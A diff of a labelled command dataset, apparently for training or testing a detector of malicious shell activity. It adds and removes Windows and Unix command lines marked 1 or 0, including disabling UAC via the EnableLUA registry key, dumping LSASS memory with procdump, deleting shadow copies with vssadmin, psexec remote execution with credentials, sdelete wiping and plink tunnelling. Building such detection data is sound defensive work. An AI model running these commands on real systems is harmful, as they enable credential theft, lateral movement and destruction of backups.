@@ -1,16 +1,16 @@
-1	cmd /c "certutil -encode -Unicode -gmt -v error.txt encode.txt"
-1	powershell -c "certutil -encode -Unicode -gmt -v error.txt encode.txt"
-1	certutil -encode -UnicodeText -gmt -v -f error.txt encode.txt
-1	cmd /c "certutil -encode -UnicodeText -gmt -v -f error.txt encode.txt"
-1	powershell -c "certutil -encode -UnicodeText -gmt -v -f error.txt encode.txt"
-1	certutil -encode -UnicodeText -gmt -v error.txt encode.txt
-1	cmd /c "certutil -encode -UnicodeText -gmt -v error.txt encode.txt"
-1	powershell -c "certutil -encode -UnicodeText -gmt -v error.txt encode.txt"
-0	powershell -c "hostname.exe"
-0	rm -f ${local_file_path} 2> error.log
-0	rm -f ${local_file_path} 2> /dev/null
-0	powershell -c "vssadmin delete shadows /all /quiet"
-0	powershell -c "procdump -mm lsass lsassdump.dmp"
-0	powershell -c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
-0	powershell -c "wmic.exe os get Caption,Version"
-0	powershell -c "plink.exe -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+1	cmd /c "reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f"
+1	powershell -c "reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f"
+1	reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD_LITTLE_ENDIAN /d 0 /f
+1	cmd /c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD_LITTLE_ENDIAN /d 0 /f"
+1	powershell -c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD_LITTLE_ENDIAN /d 0 /f"
+1	reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD_LITTLE_ENDIAN /d 0 /f
+1	cmd /c "reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD_LITTLE_ENDIAN /d 0 /f"
+1	powershell -c "reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD_LITTLE_ENDIAN /d 0 /f"
+0	rm -r ${local_file_path} 2> /dev/null
+0	cmd /c "certutil -encode -v error.txt encode.txt"
+0	powershell -c "sdelete.exe -accepteula ${local_file_path}"
+0	cmd /c "sdelete.exe -accepteula ${local_file_path}"
+0	cmd /c "wmic os get Caption,Version"
+0	nmap -v ${ip_address} 2> error.log
+0	vssadmin Delete Shadows /all
+0	powershell -c "choco install procdump"
